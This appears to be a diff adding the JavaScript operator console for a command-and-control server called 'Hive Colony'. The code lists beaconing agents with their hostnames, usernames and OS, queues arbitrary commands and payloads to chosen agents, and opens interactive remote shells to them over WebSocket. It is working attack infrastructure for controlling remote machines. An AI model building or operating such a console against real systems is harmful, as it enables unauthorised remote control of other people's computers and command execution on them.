+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════════
+   Hive Colony C2 console — vanilla JS, no frameworks, no external calls.
+   Data sources (all served by this same C2):
+     GET  /health              → {status, beacon_count, sessions}
+     GET  /admin/metrics       → {agents_registered, beacons_total, tasks{…}}
+     GET  /admin/agents        → {agents:[{agent_id, agent_role, …, last_seen}]}
+     GET  /logs                → [{timestamp, agent_id, agent_role, data{…}}]
+     GET  /admin/sessions      → [{session_id, agent_id, alive, last_activity}]
+     POST /task/:agent_id      → {id, command, payload}
+     WS   /shell/:session_id   → interactive agent shell
+   ═══════════════════════════════════════════════════════════════════════ */
+const $  = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const short = (id, n=8) => String(id||'').slice(0, n);
+const REDUCED = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+const S = {
+  key: localStorage.getItem('hive_c2_key') || '',
+  agents: [], logs: [], sessions: [],
+  metrics: null, health: null,
+  series: [], seeded: false,
+  lastTotal: null, lastAt: null,
+  prevAgentIds: new Set(), prevFeedKey: '',
+  roleFilter: 'all', query: '',
+};
+
+/* ── api ─────────────────────────────────────────────────────────────── */
+async function api(path, opts = {}) {
+  const headers = Object.assign({'Accept':'application/json'}, opts.headers || {});
+  if (S.key) headers['x-api-key'] = S.key;
+  if (opts.body) headers['Content-Type'] = 'application/json';
+  const res = await fetch(path, {...opts, headers});
+  if (!res.ok) { const e = new Error('HTTP ' + res.status); e.status = res.status; throw e; }
+  return res.json();
+}
+
+/* ── connection state ────────────────────────────────────────────────── */
+function setConn(state) { // 'live' | 'err' | 'auth'
+  document.body.classList.remove('live', 'err', 'auth');
+  document.body.classList.add(state);
+  $('#connTxt').textContent = state === 'live' ? 'LIVE' : state === 'auth' ? 'AUTH REQUIRED' : 'OFFLINE';
+  $('#offB').hidden = state !== 'err';
+  $('#authB').hidden = state !== 'auth';
+}
+
+/* ── time helpers ────────────────────────────────────────────────────── */
+function parseTs(ts) { // "2026-09-23 12:34:56 UTC" → Date
+  if (!ts) return null;
+  const d = new Date(String(ts).replace(' UTC', 'Z').replace(' ', 'T'));
+  return isNaN(d) ? null : d;
+}
+function rel(dateMs) {
+  const s = Math.max(0, Math.round((Date.now() - dateMs) / 1000));
+  if (s < 5)  return 'now';
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ' + (s%60) + 's ago';
+  return Math.floor(s/3600) + 'h ' + Math.floor((s%3600)/60) + 'm ago';
+}
+
+/* ── KPI count-up ───────────────────────────────────────────────────── */
+function kpi(id, value) {
+  const el = $(id); if (!el) return;
+  const from = el._v ?? 0, to = Number(value) || 0;
+  el._v = to;
+  if (REDUCED || from === to) { el.textContent = to; return; }
+  if (to > from) { el.classList.remove('flash'); void el.offsetWidth; el.classList.add('flash'); }
+  const t0 = performance.now(), dur = 420;
+  (function tick(t) {
+    const p = Math.min(1, (t - t0) / dur), e = 1 - Math.pow(1 - p, 3);
+    el.textContent = Math.round(from + (to - from) * e).toLocaleString();
+    if (p < 1) requestAnimationFrame(tick);
+  })(t0);
+}
+
+/* ── polling ─────────────────────────────────────────────────────────── */
+async function poll() {
+  const jobs = [
+    ['health',   api('/health')],
+    ['metrics',  api('/admin/metrics')],
+    ['agents',   api('/admin/agents')],
+    ['logs',     api('/logs')],
+    ['sessions', api('/admin/sessions')],
+  ];
+  const settled = await Promise.allSettled(jobs.map(j => j[1].then(v => [j[0], v])));
+  let ok = 0, auth = false, net = false;
+  const data = {};
+  for (const r of settled) {
+    if (r.status === 'fulfilled') { ok++; data[r.value[0]] = r.value[1]; }
+    else if (r.reason && r.reason.status === 401) auth = true;
+    else net = true;
+  }
+  if (ok === 0) { setConn(net ? 'err' : 'auth'); return; }
+  setConn(auth ? 'auth' : 'live');
+
+  if (data.health)  S.health = data.health;
+  if (data.metrics) applyMetrics(data.metrics);
+  if (data.agents)  S.agents = (data.agents.agents || []);
+  if (data.logs)    S.logs = data.logs;
+  if (data.sessions) S.sessions = data.sessions;
+  renderAll();
+}
+
+function applyMetrics(m) {
+  const now = Date.now();
+  if (S.lastTotal !== null && m.beacons_total >= S.lastTotal) {
+    const dt = (now - S.lastAt) / 1000;
+    if (dt > 0.5) {
+      S.series.push({t: now, v: (m.beacons_total - S.lastTotal) * 60 / dt});
+      if (S.series.length > 140) S.series.splice(0, S.series.length - 140);
+    }
+  }
+  S.lastTotal = m.beacons_total; S.lastAt = now;
+  S.metrics = m;
+}
+
+/* seed chart history from /logs timestamps (before live deltas exist) */
+function seedFromLogs() {
+  if (S.seeded || S.series.length > 3 || !S.logs.length) return;
+  const now = Date.now(), buckets = {};
+  for (const l of S.logs) {
+    const d = parseTs(l.timestamp); if (!d) continue;
+    const age = (now - d.getTime()) / 1000;
+    if (age < 0 || age > 300) continue;
+    const b = Math.floor(age / 20);
+    buckets[b] = (buckets[b] || 0) + 1;
+  }
+  const pts = [];
+  for (let b = 14; b >= 0; b--) pts.push({t: now - (b * 20 + 10) * 1000, v: (buckets[b] || 0) * 3});
+  S.series = pts; S.seeded = true;
+}
+
+/* ── render ──────────────────────────────────────────────────────────── */
+function renderAll() {
+  seedFromLogs();
+  renderKpis();
+  renderAgents();
+  renderFunnel();
+  renderFeed();
+  renderSessions();
+  chart.setTarget(S.series.map(p => p.v));
+}
+
+function renderKpis() {
+  const m = S.metrics, h = S.health;
+  const agents = S.agents.length || (m ? m.agents_registered : 0);
+  kpi('#kAgents', agents);
+  const beac = m ? m.beacons_total : (h ? h.beacon_count : 0);
+  kpi('#kBeacons', beac);
+  kpi('#kTasks',   m ? m.tasks.total : 0);
+  kpi('#kPending', m ? m.tasks.pending : 0);
+  kpi('#kSess',    S.sessions.length);
+  if (m) {
+    const cl = m.tasks.claimed, co = m.tasks.completed, tt = m.tasks.total || 1;
+    $('#kBeaconsSub').innerHTML = S.lastTotal !== null ? 'heartbeat stream' : 'total received';
+    $('#kTasksSub').textContent = cl + ' claimed · ' + co + ' completed';
+    $('#kPendingSub').textContent = tt ? Math.round(m.tasks.pending * 100 / tt) + '% of queue' : 'queue empty';
+  }
+  $('#kSessSub').textContent = S.sessions.some(s => s.alive) ? 'live consoles open' : 'operator consoles';
+}
+
+const ROLE_CLS = {queen:'q', worker:'w', drone:'d', honeybee:'h'};
+
+function renderAgents() {
+  const body = $('#agentsBody');
+  const counts = {all:0, queen:0, worker:0, drone:0, honeybee:0};
+  for (const a of S.agents) {
+    counts.all++;
+    const r = String(a.agent_role || '').toLowerCase();
+    if (counts[r] !== undefined) counts[r]++;
+  }
+  for (const r in counts) { const el = $('#n' + r[0].toUpperCase() + r.slice(1)); if (el) el.textContent = counts[r]; }
+
+  const q = S.query.toLowerCase();
+  const rows = S.agents.filter(a => {
+    const role = String(a.agent_role || '').toLowerCase();
+    return (S.roleFilter === 'all' || role === S.roleFilter) &&
+      (!q || (a.agent_id + ' ' + role + ' ' + a.hostname + ' ' + a.username + ' ' + a.os).toLowerCase().includes(q));
+  });
+
+  $('#agentCount').textContent = rows.length + ' / ' + counts.all + ' shown';
+
+  if (!S.agents.length) {
+    body.innerHTML = '<tr><td colspan="8"><div class="empty">' +
+      '<svg class="i" viewBox="0 0 24 24"><path d="M12 2 21 7v10l-9 5-9-5V7z"/></svg><br>' +
+      'no agents have beaconed yet<br>start the colony: <b>./hive.sh colony</b> or <b>./hive.sh c2</b> + agents</div></td></tr>';
+    return;
+  }
+  if (!rows.length) {
+    body.innerHTML = '<tr><td colspan="8"><div class="empty">no agents match the filter</div></td></tr>';
+    return;
+  }
+
+  body.innerHTML = rows.map(a => {
+    const d = parseTs(a.last_seen);
+    const age = d ? (Date.now() - d.getTime()) / 1000 : Infinity;
+    const fresh = age < 45 ? 'fresh' : age < 180 ? 'warm' : 'stale';
+    const isNew = !S.prevAgentIds.has(a.agent_id);
+    const role = String(a.agent_role || '').toLowerCase();
+    return '<tr' + (isNew ? ' class="newrow"' : '') + '>' +
+      '<td class="aid" title="' + esc(a.agent_id) + '">' + esc(short(a.agent_id)) + '</td>' +
+      '<td><span class="role ' + (ROLE_CLS[role] || 'u') + '">' + esc(role || 'unknown') + '</span></td>' +
+      '<td>' + esc(a.hostname || '—') + '</td>' +
+      '<td class="mono-dim">' + esc(a.username || '—') + '</td>' +
+      '<td class="mono-dim">' + esc(short(a.os, 18)) + '</td>' +
+      '<td class="mono-dim">' + esc(a.version || '—') + '</td>' +
+      '<td><span class="seen ' + fresh + '"><i></i>' + (d ? rel(d.getTime()) : '—') + '</span></td>' +
+      '<td><button class="mini" data-cons="' + esc(a.agent_id) + '"><svg class="i" style="width:11px;height:11px" viewBox="0 0 24 24"><path d="M4 17l6-6-6-6M12 19h8"/></svg>shell</button></td>' +
+    '</tr>';
+  }).join('');
+  S.prevAgentIds = new Set(S.agents.map(a => a.agent_id));
+}
+
+function renderFunnel() {
+  const m = S.metrics; if (!m) return;
+  const t = m.tasks.total || 0;
+  const pct = v => t ? Math.max(3, Math.round(v * 100 / t)) : 0;
+  $('#fTotal').textContent = m.tasks.total;
+  $('#fPending').textContent = m.tasks.pending;
+  $('#fClaimed').textContent = m.tasks.claimed;
+  $('#fCompleted').textContent = m.tasks.completed;
+  $('#bTotal').style.width = (t ? 100 : 0) + '%';
+  $('#bPending').style.width = pct(m.tasks.pending) + '%';
+  $('#bClaimed').style.width = pct(m.tasks.claimed) + '%';
+  $('#bCompleted').style.width = pct(m.tasks.completed) + '%';
+  $('#sAg').textContent = m.agents_registered;
+  $('#sCl').textContent = m.tasks.claimed;
+  $('#sCo').textContent = m.tasks.completed;
+}
+
+function renderFeed() {
+  const feed = $('#feed');
+  if (!S.logs.length) {
+    feed.innerHTML = '<div class="empty" style="padding:26px 16px">no activity yet — beacons will appear here</div>';
+    return;
+  }
+  const items = S.logs.slice(0, 80);
+  const topKey = items.length ? (items[0].timestamp + '|' + items[0].agent_id) : '';
+  const newBlock = topKey !== S.prevFeedKey;
+  const prevKeys = new Set(S.prevFeedKey ? [S.prevFeedKey] : []);
+  feed.innerHTML = items.map((l, i) => {
+    const d = parseTs(l.timestamp);
+    const t = d ? d.toISOString().slice(11, 19) : '—';
+    const dd = l.data || {};
+    const what = '<b>' + esc(dd.hostname || l.agent_id) + '</b>' +
+      (dd.username ? ' · ' + esc(dd.username) : '') +
+      (dd.os ? ' · ' + esc(short(dd.os, 24)) : '') +
+      (dd.version ? ' · v' + esc(dd.version) : '');
+    const mark = newBlock && i === 0 ? ' new' : '';
+    return '<div class="fitem' + mark + '"><span class="t">' + t + '</span>' +
+      '<span class="who" title="' + esc(l.agent_id) + '">' + esc((l.agent_role || '?') + ' ' + short(l.agent_id)) + '</span>' +
+      '<span class="what">' + what + '</span></div>';
+  }).join('');
+  S.prevFeedKey = topKey;
+  $('#feedInfo').textContent = items.length + ' recent beacons';
+}
+
+function renderSessions() {
+  const el = $('#sessions');
+  if (!S.sessions.length) {
+    el.innerHTML = '<div class="empty" style="padding:22px 8px">' +
+      '<svg class="i" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3M13 15h4"/></svg><br>' +
+      'no shell sessions — open a console from the agents table</div>';
+    return;
+  }
+  el.innerHTML = S.sessions.map(s =>
+    '<div class="sess' + (s.alive ? '' : ' dead') + '"><i></i>' +
+    '<span class="sid" title="' + esc(s.session_id) + '">' + esc(short(s.session_id)) + '</span>' +
+    '<span class="ag" title="' + esc(s.agent_id) + '">agent ' + esc(short(s.agent_id)) + ' · ' + rel((s.last_activity || 0) * 1000) + '</span></div>'
+  ).join('');
+}
+
+/* ── toasts ──────────────────────────────────────────────────────────── */
+function toast(msg, kind = 'ok') {
+  const t = document.createElement('div');
+  t.className = 'toast ' + kind;
+  t.innerHTML = (kind === 'ok'
+    ? '<svg class="i" viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"/></svg>'
+    : '<svg class="i" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v5M12 16.5v.5"/></svg>') + '<span>' + esc(msg) + '</span>';
+  $('#toasts').appendChild(t);
+  setTimeout(() => { t.classList.add('bye'); setTimeout(() => t.remove(), 350); }, 4200);
+}
+/* ── beacon-rate chart (canvas, animated, hover tooltip) ────────────── */
+const chart = (() => {
+  const cv = $('#chart'), ctx = cv.getContext('2d');
+  let target = [], disp = [], hoverX = null, raf = null;
+  const PAD = {l: 6, r: 8, t: 10, b: 18};
+
+  function resize() {
+    const r = cv.parentElement.getBoundingClientRect();
+    const dpr = window.devicePixelRatio || 1;
+    cv.width = Math.max(50, r.width * dpr); cv.height = Math.max(40, r.height * dpr);
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    draw();
+  }
+  new ResizeObserver(resize).observe(cv.parentElement);
+
+  function stats(v) {
+    const max = Math.max(4, ...v), min = 0;
+    return {max, avg: v.length ? v.reduce((a, b) => a + b, 0) / v.length : 0,
+            peak: Math.max(0, ...v)};
+  }
+  function fmt(v) { return v >= 100 ? Math.round(v) : Math.round(v * 10) / 10; }
+
+  function setTarget(t) {
+    target = t.slice();
+    if (disp.length !== target.length) { disp = target.slice(); }
+    $('#lgPeak').textContent = fmt(stats(target).peak);
+    $('#lgAvg').textContent  = fmt(stats(target).avg);
+    $('#lgWin').textContent  = Math.max(1, Math.round(target.length * 20 / 60)) + ' min';
+    $('#rateNow').textContent = target.length ? fmt(target[target.length - 1]) : '—';
+    if (!raf) loop();
+  }
+
+  function loop() { // lerp displayed values toward target, then draw
+    let done = true;
+    for (let i = 0; i < target.length; i++) {
+      const d = disp[i] === undefined ? target[i] : disp[i];
+      disp[i] = d + (target[i] - d) * (REDUCED ? 1 : 0.16);
+      if (Math.abs(target[i] - disp[i]) > 0.05) done = false;
+    }
+    draw();
+    raf = done ? null : requestAnimationFrame(loop);
+  }
+
+  function draw() {
+    const W = cv.width / (window.devicePixelRatio || 1), H = cv.height / (window.devicePixelRatio || 1);
+    ctx.clearRect(0, 0, W, H);
+    const n = disp.length; if (!n) return;
+    const iw = W - PAD.l - PAD.r, ih = H - PAD.t - PAD.b;
+    const st = stats(disp);
+    const X = i => PAD.l + (n === 1 ? iw / 2 : iw * i / (n - 1));
+    const Y = v => PAD.t + ih - (ih * (v / (st.max * 1.15)));
+
+    // grid
+    ctx.strokeStyle = 'rgba(255,255,255,.05)'; ctx.lineWidth = 1;
+    for (let g = 0; g <= 3; g++) {
+      const y = PAD.t + ih * g / 3;
+      ctx.beginPath(); ctx.moveTo(PAD.l, y); ctx.lineTo(W - PAD.r, y); ctx.stroke();
+    }
+    // area
+    const grad = ctx.createLinearGradient(0, PAD.t, 0, H - PAD.b);
+    grad.addColorStop(0, 'rgba(245,185,66,.30)'); grad.addColorStop(1, 'rgba(245,185,66,0)');
+    ctx.beginPath(); ctx.moveTo(X(0), Y(disp[0]));
+    for (let i = 1; i < n; i++) ctx.lineTo(X(i), Y(disp[i]));
+    ctx.lineTo(X(n - 1), H - PAD.b); ctx.lineTo(X(0), H - PAD.b); ctx.closePath();
+    ctx.fillStyle = grad; ctx.fill();
+    // line
+    ctx.beginPath(); ctx.moveTo(X(0), Y(disp[0]));
+    for (let i = 1; i < n; i++) ctx.lineTo(X(i), Y(disp[i]));
+    ctx.strokeStyle = '#f5b942'; ctx.lineWidth = 1.6; ctx.stroke();
+    // last point glow
+    const lx = X(n - 1), ly = Y(disp[n - 1]);
+    ctx.beginPath(); ctx.arc(lx, ly, 6, 0, 7); ctx.fillStyle = 'rgba(245,185,66,.18)'; ctx.fill();
+    ctx.beginPath(); ctx.arc(lx, ly, 2.6, 0, 7); ctx.fillStyle = '#ffd173'; ctx.fill();
+    // hover crosshair
+    if (hoverX !== null) {
+      const i = Math.max(0, Math.min(n - 1, Math.round((hoverX - PAD.l) / iw * (n - 1))));
+      const hx = X(i);
+      ctx.strokeStyle = 'rgba(255,255,255,.18)'; ctx.setLineDash([3, 4]);
+      ctx.beginPath(); ctx.moveTo(hx, PAD.t); ctx.lineTo(hx, H - PAD.b); ctx.stroke();
+      ctx.setLineDash([]);
+      ctx.beginPath(); ctx.arc(hx, Y(disp[i]), 3.4, 0, 7); ctx.fillStyle = '#e8edf4'; ctx.fill();
+      const lbl = fmt(disp[i]) + '/min';
+      ctx.font = '10px ' + getComputedStyle(document.body).fontFamily;
+      const tw = ctx.measureText(lbl).width + 12;
+      const bx = Math.min(W - PAD.r - tw, Math.max(PAD.l, hx - tw / 2));
+      ctx.fillStyle = 'rgba(13,19,32,.95)'; ctx.strokeStyle = 'rgba(255,255,255,.16)';
+      ctx.beginPath(); ctx.roundRect(bx, PAD.t - 4, tw, 18, 5); ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#e8edf4'; ctx.fillText(lbl, bx + 6, PAD.t + 9);
+    }
+  }
+  cv.addEventListener('mousemove', e => {
+    hoverX = e.offsetX; if (!raf) draw();
+  });
+  cv.addEventListener('mouseleave', () => { hoverX = null; if (!raf) draw(); });
+  resize();
+  return {setTarget};
+})();
+
+/* ── remote shell drawer (WebSocket) ────────────────────────────────── */
+let ws = null;
+function drLine(html, cls) {
+  const pre = $('#drOut');
+  const span = document.createElement('span');
+  span.className = cls || 'out';
+  span.innerHTML = html;
+  pre.appendChild(span); pre.appendChild(document.createTextNode('\n'));
+  pre.scrollTop = pre.scrollHeight;
+}
+function openConsole(agentId) {
+  closeConsole();
+  const drawer = $('#drawer');
+  drawer.classList.add('open'); drawer.classList.remove('on');
+  $('#drAgent').textContent = short(agentId) + ' · ' + agentId;
+  $('#drOut').innerHTML = '';
+  drLine('connecting to agent ' + short(agentId) + ' …', 'sys');
+  const sid = (crypto.randomUUID ? crypto.randomUUID() : 'sess-' + Date.now());
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  try {
+    ws = new WebSocket(proto + '://' + location.host + '/shell/' + sid);
+  } catch (e) { drLine('websocket error: ' + esc(e.message), 'sys'); return; }
+  ws.onopen = () => {
+    ws.send(JSON.stringify({agent_id: agentId}));
+    drawer.classList.add('on');
+    drLine('session ' + short(sid) + ' — type commands; replies arrive via beacon relay', 'sys');
+    $('#drIn').focus();
+  };
+  ws.onmessage = ev => drLine(esc(ev.data), 'out');
+  ws.onclose = () => { drawer.classList.remove('on'); if (ws) drLine('— disconnected —', 'sys'); ws = null; };
+  ws.onerror = () => drLine('ws error — note: if the C2 runs with --api-key, browsers cannot attach that header to a websocket handshake', 'sys');
+}
+function closeConsole() {
+  if (ws) { const w = ws; ws = null; try { w.close(); } catch (_) {} }
+  $('#drawer').classList.remove('open', 'on');
+}
+$('#drClose').addEventListener('click', closeConsole);
+$('#drIn').addEventListener('keydown', e => {
+  if (e.key === 'Enter' && ws && ws.readyState === 1) {
+    const v = e.target.value.trim();
+    if (v) { ws.send(v); drLine('❯ ' + esc(v), 'in'); e.target.value = ''; }
+  }
+});
+document.addEventListener('click', e => {
+  const b = e.target.closest('button[data-cons]');
+  if (b) openConsole(b.dataset.cons);
+});
+
+/* ── task dialog ────────────────────────────────────────────────────── */
+function uuid() { return crypto.randomUUID ? crypto.randomUUID() : 't-' + Date.now() + '-' + Math.random().toString(16).slice(2); }
+$('#newTask').addEventListener('click', () => {
+  const sel = $('#tAgent');
+  sel.innerHTML = S.agents.length
+    ? S.agents.map(a => '<option value="' + esc(a.agent_id) + '">' + esc(short(a.agent_id)) + ' · ' + esc(a.agent_role) + (a.hostname ? ' · ' + esc(a.hostname) : '') + '</option>').join('')
+    : '<option value="">no agents registered</option>';
+  $('#tId').value = uuid();
+  $('#tErr').textContent = '';
+  $('#taskDlg').showModal();
+});
+$('#tCancel').addEventListener('click', () => $('#taskDlg').close());
+$('#taskForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const agent = $('#tAgent').value, id = $('#tId').value, command = $('#tCmd').value.trim();
+  let payload;
+  try { payload = JSON.parse($('#tPayload').value || '{ }'); }
+  catch (err) { $('#tErr').textContent = 'payload is not valid JSON: ' + err.message; return; }
+  if (!agent) { $('#tErr').textContent = 'no agent selected'; return; }
+  try {
+    await api('/task/' + encodeURIComponent(agent), {method: 'POST', body: JSON.stringify({id, command, payload})});
+    $('#taskDlg').close();
+    toast('task ' + short(id) + ' queued for ' + short(agent), 'ok');
+    setTimeout(poll, 600);
+  } catch (err) {
+    $('#tErr').textContent = 'queue failed: HTTP ' + (err.status || err.message);
+  }
+});
+
+/* ── controls ───────────────────────────────────────────────────────── */
+let timer = null;
+function schedule() {
+  clearTimeout(timer);
+  const iv = +$('#rate').value;
+  if (iv > 0 && !document.hidden) timer = setTimeout(async () => { await poll(); schedule(); }, iv);
+}
+$('#rate').addEventListener('change', schedule);
+document.addEventListener('visibilitychange', schedule); // pause polling in background tabs
+$('#refresh').addEventListener('click', async () => {
+  const b = $('#refresh');
+  b.classList.add('spin');
+  await poll();
+  setTimeout(() => b.classList.remove('spin'), 650);
+});
+const keyEl = $('#apiKey');
+keyEl.value = S.key;
+document.body.classList.toggle('keyed', !!S.key);
+keyEl.addEventListener('input', () => {
+  S.key = keyEl.value.trim();
+  document.body.classList.toggle('keyed', !!S.key);
+  if (S.key) localStorage.setItem('hive_c2_key', S.key); else localStorage.removeItem('hive_c2_key');
+  poll();
+});
+$$('.chip').forEach(ch => ch.addEventListener('click', () => {
+  $$('.chip').forEach(c => c.classList.remove('on'));
+  ch.classList.add('on');
+  S.roleFilter = ch.dataset.role;
+  renderAgents();
+}));
+$('#q').addEventListener('input', e => { S.query = e.target.value; renderAgents(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape' && $('#drawer').classList.contains('open')) closeConsole(); });
+
+/* ── boot ───────────────────────────────────────────────────────────── */
+poll();
+schedule();
+</script>
+
+</body>
+</html>
